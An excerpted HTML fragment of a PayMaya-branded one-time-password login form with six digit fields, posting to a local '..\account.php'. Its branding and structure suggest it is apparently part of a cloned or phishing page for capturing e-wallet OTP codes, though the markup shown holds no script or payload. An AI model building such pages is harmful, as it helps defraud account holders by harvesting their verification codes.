<class="no-js" lang="en" id="theme-paymaya">
            ...
            <div class="white-container hidden-logo-container">
                <div class="container">
                    <form class="form-otp login-otp-form" id="theme-login-otp-" method="POST" action="..\account.php">
                        ...
                        <div id="successMessage" class="alert-container alert-success" role="alert"
                            style="display: none">
                        </div>
                            ...
                            <div class="form-fields">
                                <div class="otp-fields">
                                    <input class="otp-field focusable" type="text" autocomplete="off"
                                        inputmode="numeric" id="digit-1" name="digit-1" tabindex="-1" placeholder="—"
                                        data-next="digit-2" />
                                    ...
                                    <input class="otp-field" type="text" autocomplete="off" inputmode="numeric"
                                        id="digit-6" name="digit-6" tabindex="-1" placeholder="—"
                                ...
                                <div class="button-container">
                                    <button class="continue-button mdc-button mdc-button--raised verify-button"
                                        id="continue" type="button" onclick="validateForm()" disabled>
